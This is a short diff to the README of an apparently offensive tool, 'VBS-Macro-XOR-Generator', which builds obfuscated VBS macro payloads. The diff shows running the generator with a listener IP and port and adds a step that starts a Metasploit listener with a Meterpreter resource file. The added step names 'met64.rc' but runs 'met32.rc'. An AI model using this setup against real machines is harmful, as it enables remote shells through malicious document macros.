@@ -65,6 +65,11 @@ cd VBS-Macro-XOR-Generator
 ```sh
 python3 VBS_X0rG3n.py --LHOST 10.10.10.10 --LPORT 4444
 ```
+4. Run the MSF with the newly generated met64.rc file
+
+```
+msfconsole -r met32.rc
+```
 
 Replace `10.10.10.10` with your actual LHOST (Local Host) IP and `4444` with your desired LPORT (Local Port).
 
